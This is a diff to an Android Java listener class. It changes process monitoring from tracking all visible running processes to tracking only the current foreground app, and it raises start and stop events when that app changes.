@@ -27,8 +27,10 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 	private static final String TAG = "ListenerProcess"; //$NON-NLS-1$
 
 	private BroadcastMonitorProcess processReceiver;
-	TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
-	TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
+	//TreeMap<String, RunningAppProcessInfo> lastRunning = new TreeMap<String, RunningAppProcessInfo>();
+	//TreeMap<String, RunningAppProcessInfo> currentRunning = new TreeMap<String, RunningAppProcessInfo>();
+	String currentForeground;
+	String lastForeground;
 
 	private boolean started;
 
@@ -118,49 +120,21 @@ public class ListenerProcess extends Listener<ProcessInfo> implements Observer<S
 	}
 	
 	public synchronized boolean isRunning(String appName){
-		return currentRunning.containsKey(appName);
+		return currentForeground.equals(appName);
 	}
 
 	protected synchronized int dispatch(RunningProcesses processes) {
-		final ArrayList<RunningAppProcessInfo> list = processes.getProcessList();
-		
-		if (list == null) {
-			return 0;
-		}
-		
-		currentRunning.clear();
-
-		for (final Object element : list) {
-			final RunningAppProcessInfo running = (RunningAppProcessInfo) element;
-			
-			if (running.importance == RunningAppProcessInfo.IMPORTANCE_VISIBLE) {
-
-				currentRunning.put(running.processName, running);
-				
-				if (!lastRunning.containsKey(running.processName)) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (notification): started " + running.processName);//$NON-NLS-1$
-					}
-					
-					dispatch(new ProcessInfo(running, ProcessStatus.START));
-				} else {
-					lastRunning.remove(running.processName);
-				}
-			}
-		}
-
-		for (final Object element : lastRunning.keySet()) {
-			final RunningAppProcessInfo norun = lastRunning.get(element);
-			
+		currentForeground = processes.getForeground();
+		if(!currentForeground.equals(lastForeground)){
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification): stopped " + norun.processName);//$NON-NLS-1$
+				Check.log(TAG + " (notification): started " + currentForeground);//$NON-NLS-1$
 			}
-			
-			super.dispatch(new ProcessInfo(norun, ProcessStatus.STOP));
-
+			dispatch(new ProcessInfo(currentForeground, ProcessStatus.START));
+			if(lastForeground!=null){
+				super.dispatch(new ProcessInfo(lastForeground, ProcessStatus.STOP));
+			}
+			lastForeground = currentForeground;
 		}
-
-		lastRunning = (TreeMap<String, RunningAppProcessInfo>) currentRunning.clone();
 
 		return 0;
 	}
